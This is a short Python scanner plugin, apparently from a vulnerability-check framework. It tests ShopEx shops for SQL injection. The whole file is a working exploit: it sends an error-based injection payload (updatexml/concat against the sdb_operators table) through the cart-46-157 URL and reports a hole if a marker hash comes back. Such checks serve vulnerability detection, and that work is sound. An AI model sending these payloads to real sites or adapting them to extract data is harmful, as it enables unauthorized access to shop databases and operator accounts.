#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "shopex":
        return True, arg

def audit(arg):
    url = arg
    code, head, body, _, _ = curl.curl(url + '/?cart-46-157)and(1)=(updatexml(1,concat(0x23,(select(md5(3.1415))from(sdb_operators)),0x23),1))%23-addGoodsToCart.html')
    if code == 200:
        if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
            security_hole(url + '/?cart-46-157)and(1)=(updatexml(1,concat(0x23,(select(md5(3.1415))from(sdb_operators)),0x23),1))%23-addGoodsToCart.html')

if __name__ == '__main__':
    from dummy import *
    audit(assign('shopex', 'http://www.example.com/')[1])